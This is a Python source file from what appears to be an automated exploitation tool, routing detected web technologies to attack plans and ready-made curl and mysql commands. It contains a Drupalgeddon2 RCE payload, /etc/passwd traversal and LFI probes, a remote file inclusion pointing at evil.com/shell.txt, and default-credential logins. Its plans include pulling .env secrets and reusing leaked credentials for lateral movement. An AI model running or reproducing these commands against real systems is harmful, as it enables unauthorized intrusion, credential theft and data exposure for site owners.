"""
Evidence Router: Maps detected findings to appropriate exploitation strategies.
Enables intelligent tool selection based on what we actually found.
"""

from intelligence.cve_database import find_cves_for_tech


class EvidenceRouter:
    """
    Routes findings to specific exploitation approaches.
    Turns passive reconnaissance into active exploitation plans.
    """

    # Routing rules: IF we find this evidence, THEN try this approach
    ROUTING_RULES = {
        "wordpress": {
            "confidence": 0.9,
            "tools": ["curl", "nuclei", "wpscan"],
            "approaches": [
                "Check /wp-json/wp/v2/users for unauthenticated user enumeration",
                "Attempt default WordPress login via ?author=1 author redirect",
                "Test xmlrpc.php for system.listMethods brute-force enablement",
                "Try default credentials on /wp-login.php (admin/admin, admin/password)",
                "Check /wp-content/uploads/ for directory listing and uploaded shells",
                "Probe /wp-json/wp/v2/settings for unauthenticated options exposure",
            ]
        },
        "litespeed": {
            "confidence": 0.75,
            "evidence_patterns": ["litespeed", "lscache", "x-litespeed", "ls-cache"],
            "tools": ["curl"],
            "approaches": [
                "Check for LiteSpeed debug endpoints /?debug=1",
                "Test cache poisoning via X-Forwarded-Host header injection",
                "Probe /.well-known/traffic-advice for exposed config",
                "Check /wp-login.php response for LiteSpeed anti-brute headers",
            ]
        },
        "joomla": {
            "confidence": 0.9,
            "evidence_patterns": ["joomla", "/media/jui/", "joomla!"],
            "tools": ["curl", "nuclei"],
            "approaches": [
                "Check /administrator/ for login panel existence",
                "Enumerate Joomla version via /administrator/manifests/files/joomla.xml",
                "Test /api/index.php/v1/config/application?public=true for config exposure",
            ]
        },
        "drupal": {
            "confidence": 0.9,
            "evidence_patterns": ["drupal", "/sites/default/"],
            "tools": ["curl", "nuclei"],
            "approaches": [
                "Check /CHANGELOG.txt or /core/CHANGELOG.txt for version disclosure",
                "Probe /user/register for Drupalgeddon2 (CVE-2018-7600) indicators",
                "Check /sites/default/settings.php for exposed database credentials",
            ]
        },
        "php": {
            "confidence": 0.85,
            "tools": ["dalfox", "commix", "curl"],
            "approaches": [
                "Test all form inputs for command injection with commix",
                "Test for file inclusion (LFI/RFI) on file parameters",
                "Look for exposed error messages revealing source code",
                "Check for PHP info disclosure at /phpinfo.php or /info.php",
            ]
        },
        "apache": {
            "confidence": 0.9,
            "tools": ["curl", "nmap"],
            "approaches": [
                "Check if TRACE method is enabled (potential XST attack)",
                "Test for mod_userdir disclosure (/~username/)",
                "Check for directory listing in /",
            ]
        },
        "nginx": {
            "confidence": 0.85,
            "tools": ["curl"],
            "approaches": [
                "Test for alias traversal via /path/..;/file",
                "Check for path normalization issues",
                "Enumerate location blocks with UPPERCASE methods",
            ]
        },
        "mysql": {
            "confidence": 0.7,
            "tools": ["curl", "nmap"],
            "approaches": [
                "Attempt to connect with default credentials (root/root, root/password)",
                "Check if database is exposed on network (port 3306)",
                "Look for SQL error messages revealing database version",
            ]
        },
        "ssh": {
            "confidence": 0.8,
            "tools": ["hydra", "ssh"],
            "approaches": [
                "Attempt SSH key-based authentication if keys are found",
                "Test for weak SSH configurations via ssh-audit",
                "Enumerate users via timing attacks",
            ]
        },
        "ftp": {
            "confidence": 0.8,
            "tools": ["curl"],
            "approaches": [
                "Attempt anonymous FTP login",
                "Check for FTP bounce attacks",
                "List FTP directory contents",
            ]
        },
        "github": {
            "confidence": 0.9,
            "evidence_patterns": [".git/", "github", "gitlab"],
            "tools": ["curl"],
            "approaches": [
                "Check /.git/config for repository URL",
                "Download .git/HEAD to confirm Git presence",
                "Attempt git clone if .git is publicly accessible",
            ]
        },
        "env_file": {
            "confidence": 0.95,
            "evidence_patterns": [".env", ".env.local", ".env.production"],
            "tools": ["curl"],
            "approaches": [
                "Download .env file directly",
                "Extract API keys, database credentials from file",
                "Attempt to use leaked credentials for lateral movement",
            ]
        },
        "backup_file": {
            "confidence": 0.85,
            "evidence_patterns": [".bak", ".old", ".zip", "backup", "~", ".tar"],
            "tools": ["curl"],
            "approaches": [
                "Probe /backup.zip, /backup.tar.gz, /site.bak for backup archives",
                "Check /wp-config.php.bak and /wp-config.bak for WordPress config backups",
                "Attempt /db.sql, /database.sql, /dump.sql for database dumps",
            ]
        },
        "s3_bucket": {
            "confidence": 0.9,
            "evidence_patterns": ["s3://", "amazonaws.com"],
            "tools": ["aws-cli", "curl"],
            "approaches": [
                "List S3 bucket contents if publicly accessible",
                "Check for sensitive files (keys, configs, backups)",
                "Attempt to put objects if write permissions exist",
            ]
        },
        "jwt": {
            "confidence": 0.8,
            "evidence_patterns": ["jwt", "bearer", "token"],
            "tools": ["curl", "jwt-cli"],
            "approaches": [
                "Decode JWT to extract claims and identify algorithm",
                "Check if signature verification is weak or missing",
                "Attempt JWT forgery with HS256->RS256 confusion",
            ]
        },
        "cors": {
            "confidence": 0.7,
            "evidence_patterns": ["access-control-allow-origin"],
            "tools": ["curl"],
            "approaches": [
                "Spoof Origin header to test CORS policy",
                "Check if credentials are included in CORS response",
                "Attempt to access protected endpoints via CORS",
            ]
        },
    }

    @staticmethod
    def route_finding(finding: dict) -> dict:
        """
        Route a single finding to exploitation approaches.

        Args:
            finding: Dict with type, detail, severity, etc.

        Returns:
            Dict with {approaches: [...], tools: [...], confidence: float}
        """
        finding_type = finding.get("type", "").lower()
        detail = finding.get("detail", "").lower()

        # Try exact match first
        for route_key, route_config in EvidenceRouter.ROUTING_RULES.items():
            if route_key in finding_type or route_key in detail:
                return {
                    "finding_type": finding_type,
                    "matched_rule": route_key,
                    **route_config
                }

        # Try pattern matching across all route definitions
        for route_key, route_config in EvidenceRouter.ROUTING_RULES.items():
            patterns = route_config.get("evidence_patterns", [])
            for pattern in patterns:
                if pattern.lower() in detail:
                    return {
                        "finding_type": finding_type,
                        "matched_rule": route_key,
                        **route_config
                    }

        # No specific route found
        return {
            "finding_type": finding_type,
            "matched_rule": None,
            "confidence": 0.0,
            "approaches": ["Use generic exploitation tools on this finding"],
            "tools": ["curl", "sqlmap", "commix"],
        }

    @staticmethod
    def route_findings_batch(findings: list) -> dict:
        """
        Route multiple findings and group by priority.

        Returns:
            {
                "critical": [...],
                "high": [...],
                "medium": [...],
                "low": [...],
            }
        """
        routed = {}

        for finding in findings:
            severity = finding.get("severity", "low")
            if severity not in routed:
                routed[severity] = []

            route = EvidenceRouter.route_finding(finding)
            routed[severity].append({
                **finding,
                **route
            })

        return routed

    @staticmethod
    def get_recommended_commands(routed_findings: list) -> list:
        """
        Convert routed findings into actual exploitation commands.

        This is where findings become actionable commands.
        """
        commands = []

        for finding in routed_findings:
            approaches = finding.get("approaches", [])
            tools = finding.get("tools", [])
            target = finding.get("target", "")

            # Limit to top 2 approaches per finding
            for approach in approaches[:2]:
                commands.append({
                    "approach": approach,
                    "tools_to_try": tools,
                    "target": target,
                    "finding_type": finding.get("matched_rule"),
                    "priority": finding.get("severity", "low"),
                })

        return commands


class TechStackRouter:
    """
    Routes technology stack findings to CVE-targeted exploitation commands.
    Uses nuclei_template_id from cve_database for precision scanning.
    """

    @staticmethod
    def route_tech_stack(tech_stack: list) -> list:
        """
        Given a list of detected technologies, produce exploitation commands.

        Args:
            tech_stack: List of strings like ["WordPress 5.8", "Apache 2.4", "PHP 7.4",
                        "CMS: WordPress", "SPA Framework: React"]

        Returns:
            List of command dicts: {command, description, priority, tech, version}
        """

        commands = []
        seen_templates: set = set()

        for tech_info in tech_stack:
            if not isinstance(tech_info, str):
                continue

            # Normalise: strip prefixes like "CMS: ", "SPA Framework: "
            clean = tech_info
            for prefix in ("CMS: ", "SPA Framework: ", "Server: ", "Tech: "):
                if clean.startswith(prefix):
                    clean = clean[len(prefix):]
                    break

            parts = clean.split()
            if not parts:
                continue
            tech_name = parts[0].lower()
            version = parts[1] if len(parts) > 1 else None

            cves = find_cves_for_tech(tech_name, version)

            for cve_info in cves:
                # ── 1. Nuclei template-based commands (highest precision) ──
                nuclei_tid = cve_info.get("nuclei_template_id")
                if nuclei_tid and nuclei_tid not in seen_templates:
                    seen_templates.add(nuclei_tid)
                    cve_ids = cve_info.get("cves", [])
                    cve_label = ", ".join(
                        cve_ids) if cve_ids else f"{tech_name} generic"
                    commands.append({
                        "tech": tech_name,
                        "version": version or "all",
                        "exploit_type": "nuclei_cve_scan",
                        "command": f"nuclei -u {{target}} -t {nuclei_tid} -silent",
                        "description": f"Nuclei CVE scan: {cve_label}",
                        "priority": cve_info.get("severity", "medium"),
                    })

                # ── 2. Direct exploit commands from CVE entry ──
                direct_cmd = cve_info.get("command")
                direct_desc = cve_info.get("description", "")
                if direct_cmd and direct_cmd not in seen_templates:
                    seen_templates.add(direct_cmd)
                    commands.append({
                        "tech": tech_name,
                        "version": version or "all",
                        "exploit_type": "direct_exploit",
                        "command": direct_cmd,
                        "description": direct_desc,
                        "priority": cve_info.get("severity", "high"),
                    })

                # ── 3. Exploit-type -> command table ──
                for exploit_type in cve_info.get("exploit_types", []):
                    cmd = TechStackRouter._exploit_type_to_command(
                        tech_name, version, exploit_type)
                    if cmd and cmd.get("command") not in seen_templates:
                        seen_templates.add(cmd["command"])
                        commands.append(cmd)

        return commands

    @staticmethod
    def _exploit_type_to_command(
            tech_name: str, version: str, exploit_type: str) -> dict | None:
        """
        Table-driven conversion: exploit_type string -> shell command dict.
        Returns None if no mapping exists for this combo.
        """
        t = "{target}"  # placeholder; exploitation_agent will substitute real URL

        mapping = {
            # WordPress
            ("wordpress", "plugin_upload_rce"):
                (f"curl -sk --max-time 15 {t}/wp-json/wp/v2/plugins",
                 "WordPress REST: list installed plugins (may expose vulnerable ones)", "high"),
            ("wordpress", "unauthenticated_options_exposure"):
                (f"curl -sk --max-time 10 {t}/wp-json/wp/v2/settings/",
                 "WordPress REST API settings disclosure", "high"),
            ("wordpress", "user_enumeration"):
                (f"curl -sk --max-time 10 '{t}/?author=1' -D - | grep -i location",
                 "WordPress user enum via ?author=1 redirect", "medium"),
            ("wordpress", "xmlrpc_brute"):
                (f"curl -sk --max-time 15 -X POST {t}/xmlrpc.php "
                 f"-d '<?xml version=\"1.0\"?><methodCall><methodName>system.listMethods</methodName>"
                 f"<params></params></methodCall>'",
                 "WordPress xmlrpc.php listMethods (brute-force surface)", "high"),

            # Apache
            ("apache", "path_traversal_rce"):
                (f"curl -sk --max-time 10 '{t}/cgi-bin/../../../../etc/passwd'",
                 "Apache path traversal to /etc/passwd", "critical"),
            ("apache", "trace_method_enabled"):
                (f"curl -sk --max-time 10 -X TRACE {t}/",
                 "Apache TRACE method enabled (XST risk)", "medium"),
            ("apache", "directory_listing"):
                (f"curl -sk --max-time 10 {t}/ | grep -i 'index of'",
                 "Apache directory listing check", "medium"),

            # Nginx
            ("nginx", "alias_traversal"):
                (f"curl -sk --max-time 10 '{t}/static/..;/etc/passwd'",
                 "Nginx alias traversal", "high"),

            # PHP
            ("php", "lfi"):
                (f"curl -sk --max-time 10 '{t}/?page=../../../../etc/passwd'",
                 "PHP LFI attempt on ?page parameter", "high"),
            ("php", "rfi"):
                (f"curl -sk --max-time 10 '{t}/?file=http://evil.com/shell.txt'",
                 "PHP RFI attempt on ?file parameter", "high"),

            # Drupal
            ("drupal", "rce"):
                (f"curl -sk --max-time 15 {t}/user/register "
                 f"--data 'mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id' "
                 f"-H 'Content-Type: application/x-www-form-urlencoded'",
                 "Drupalgeddon2 (CVE-2018-7600) RCE probe", "critical"),

            # Joomla
            ("joomla", "config_exposure"):
                (f"curl -sk --max-time 10 "
                 f"'{t}/api/index.php/v1/config/application?public=true'",
                 "Joomla config API exposure", "high"),

            # LiteSpeed
            ("litespeed", "cache_poisoning"):
                (f"curl -sk --max-time 10 {t}/ "
                 f"-H 'X-Forwarded-Host: evil.com' -H 'X-Forwarded-Proto: https' "
                 f"| grep -i 'evil.com'",
                 "LiteSpeed cache poisoning via X-Forwarded-Host", "medium"),

            # MySQL
            ("mysql", "weak_credentials"):
                ("mysql -h {host} -u root --password='' -e 'show databases;' 2>&1 | head -10",
                 "MySQL default root credentials probe", "high"),
        }

        result = mapping.get((tech_name, exploit_type))
        if result:
            cmd_str, desc, priority = result
            return {
                "tech": tech_name,
                "version": version or "all",
                "exploit_type": exploit_type,
                "command": cmd_str,
                "description": desc,
                "priority": priority,
            }
        return None
